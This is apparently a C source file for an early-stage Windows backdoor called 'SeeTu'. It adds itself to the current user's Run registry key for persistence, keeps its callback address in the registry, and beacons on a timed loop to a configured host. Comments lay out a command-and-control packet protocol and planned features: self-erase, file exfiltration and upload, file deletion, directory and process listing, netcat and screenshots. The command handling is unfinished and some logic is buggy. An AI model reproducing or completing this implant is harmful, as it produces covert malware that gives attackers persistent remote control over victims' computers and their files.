#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include <winsock2.h>

struct s_configs{
  uint32_t out_addr; //= 0x100007f;//127.0.0.1
  uint16_t out_port; //= 0x901f;//8080
  uint8_t sleep_hour; //= 1;
  uint8_t sleep_mins; //= 15;
};

int beacon(struct s_configs *configs){
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if(sockfd == INVALID_SOCKET){
    return -1;
  }

  struct sockaddr_in saddr;
  memset(&saddr, 0, sizeof(saddr));
  saddr.sin_family = AF_INET;
  saddr.sin_port = configs->out_port;
  saddr.sin_addr.s_addr = configs->out_addr;

  if(connect(sockfd, (SOCKADDR *)&saddr, sizeof(saddr)) == SOCKET_ERROR){
    return -1;
    closesocket(sockfd);
  }
    return sockfd;
}

int naptime(struct s_configs *configs){
  for(int i = 0; i < configs->sleep_hour; i++){
    Sleep(3600000);
  }
  for(int i = 0; i < configs->sleep_mins; i++){
    Sleep(60000);
  }
}

int get_configs(struct s_configs *configs){
  HKEY hkey;
  ULONGLONG reg_config;
  int size = sizeof(reg_config);
  RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_QUERY_VALUE, &hkey);
  RegGetValueA(hkey, "SeeTu\\Settings", "configs", RRF_RT_REG_QWORD, NULL, &reg_config, &size);
  configs->out_addr = ((reg_config & 0xFFFFFFFF00000000) >> 32);
  configs->out_port = ((reg_config & 0xFFFF0000) >> 16);
  configs->sleep_hour = ((reg_config & 0xFF00) >> 8);
  configs->sleep_mins = (reg_config & 0xFF);
  RegCloseKey(hkey);
  return 0;
}

int setup(struct s_configs *configs){
  char filepath[255];
  char autocommand[255];
  HKEY hkey;
  ULONGLONG reg_config;
  GetModuleFileNameA(NULL, filepath, sizeof(filepath));
  snprintf(autocommand, sizeof(autocommand), "%s -- autostart", filepath);
  RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey);
  RegSetValueExA(hkey, "SeeTu", 0, REG_SZ, autocommand, sizeof(autocommand));
  RegCloseKey(hkey);
  reg_config += configs->out_addr * 0x100000000;
  reg_config += configs->out_port * 0x10000;
  reg_config += configs->sleep_hour * 0x100;
  reg_config += configs->sleep_mins;
  RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_CREATE_SUB_KEY, &hkey);
  RegCreateKeyExA(hkey, "SeeTu\\Settings", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL);
  RegSetValueExA(hkey, "configs", 0, REG_QWORD, (const BYTE*)&reg_config, sizeof(reg_config));
  RegCloseKey(hkey);
  return 0;
}

int main(int argc, char *argv[]){
  //wake up daddys home
  struct s_configs configs;
  memset(&configs, 0, sizeof(configs));
  //[START CONFIGS]
  configs.out_addr = 0x0100007f;//127.0.0.1 --0100007f901f010f
  configs.out_port = 0x901f;//8080
  configs.sleep_hour = 1;
  configs.sleep_mins = 15;
  //[END CONFIGS]

  if(argc < 1 && strncmp(argv[1], "--autostart", 11) == 0){
    get_configs(&configs);
  }
  else{
    setup(&configs);
  }

  while(1 == 1){
    int sockfd = beacon(&configs);
    if(sockfd == -1){
      naptime(&configs);
      continue;
    }

    closesocket(sockfd);
    naptime(&configs);
  }
  return 0;
}

/*
1. BEACON
+----------+-----------+----------+----------+
|   SYNC   |    TYPE   | ADDR LEN |   ADDR   |
+----------+-----------+----------+----------+
|   0xAA   |    0x00   |     1    | VARIABLE |
+----------+-----------+----------+----------+

2. COMMAND
+----------+----------+----------+----------+----------+
|   SYNC   |   TYPE   | DATA LEN | COMMANDS |   DATA   |
+----------+----------+----------+----------+----------+
|   0xAA   |   0x01   |     1    |     2    | VARIABLE |
+----------+----------+----------+----------+----------+

3. REPLY
+----------+----------+----------+----------+----------+
|   SYNC   |   TYPE   | DATA LEN |  COMMAND |   DATA   |
+----------+----------+----------+----------+----------+
|   0xAA   |   0x02   |     1    |     2    |    0xAA  |
+----------+----------+----------+----------+----------+

4. TERMINATE
+----------+----------+----------+----------+----------+----------+----------+
|   SYNC   |   TYPE   | ADDR LEN |   ADDR   |   PORT   |SLEEP HOUR| SLEEP MIN|
+----------+----------+----------+----------+----------+----------+----------+
|   0xAA   |   0x03   |     1    | VARIABLE |     2    |     1    |     1    |
+----------+----------+----------+----------+----------+----------+----------+

TYPE: Indicates the packet type
  0x00: BEACON
  0x01: COMMAND
  0x02: REPLY
  0x03: TERMINATE
*/

/*
COMMANDS & OFFSETS
Several commands will initiate a sub-negotiation
...............0 = CHANGE CONFIGS, 8 bytes
..............0. = SELF ERASE, no offset
.............0.. = RECONNECT, no offset
............0... = CAT FILE, no offset
...........0.... = RECEVIE FILE, no offset
..........0..... = SEND FILE, no offset
.........0...... = DELETE FILE, no offset
........0....... = LS DIRECTORUES, no offset
.......0........ = PROCESS LIST, no offset
......0......... = NETCAT, no offset
.....0.......... = DISPLAY MESSAGE, no offset DANGER!!!PRINTS TO STDOUT!!!DANGER
....0........... = SCREENSHOT, no offset
...0............ = RSV
..0............. = RSV
.0.............. = RSV
0............... = RSV
*/
